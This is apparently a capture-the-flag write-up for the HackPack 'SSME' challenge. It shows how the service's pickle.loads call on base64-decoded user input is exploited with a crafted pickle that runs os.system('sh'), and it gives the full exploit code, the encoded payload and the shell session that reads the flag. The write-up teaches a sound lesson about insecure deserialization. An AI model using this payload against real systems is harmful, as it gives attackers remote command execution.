---
title: "HackPack: SSME"
categories:
  - HackPackCTF
tags:
  - HackPackCTF
---


Connecting to the vulnerable message encryption service returns a small User Interface:

```
nc cha.hackpack.club 41704

[*] Welcome to our Super Secure Message Encrypter (SSME - copyright pending)
[*] We use patented technology that only we have access to in order to safely encrypt your data
[*] Please use this tool to encrypt/decrypt messages

[*] Please select from the following options
1.) Encrypt a message
2.) Read a message
3.) Quit
```

We can try to read a message, and input a weird character ('):

```
Traceback (most recent call last):
  File "/home/challenger/app.py", line 46, in <module>
    main()                                                                                                           
  File "/home/challenger/app.py", line 37, in main                                                                   
    dec = decrypt(to_dec)                                                                                            
  File "/home/challenger/app.py", line 24, in decrypt                                                                                                                                                                                      
    return pickle.loads(codecs.decode(to_dec.encode(), "base64"))           
_pickle.UnpicklingError: invalid load key, '\xa2'.  
```

That pickle.loads error is interesting. We'll find a PoC for this:

```
import pickle
import os
class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('sh', ))
pickle_data = pickle.dumps(EvilPickle())
with open("backup.data", "wb") as file:
    file.write(pickle_data)
```

Running this with python, we can see that backup.data file created:

```
python test.py
cat backup.data

cposix
system
p0
(S'sh'
p1
tp2
Rp3
```

We can see that it's being base64 decoded on the server side, so we can run the following:

```
cat backup.data | base64 | pbcopy
```

Now, we'll try to read a file again:

```
Please enter the encrypted string here: Y3Bvc2l4CnN5c3RlbQpwMAooUydzaCcKcDEKdHAyClJwMwou

whoami
challenger

ls
app.py
flag.txt
cat flag.txt
flag{n3v3R_u$e_p!ckLe_w_uNtru$t3d_d4t4}
```
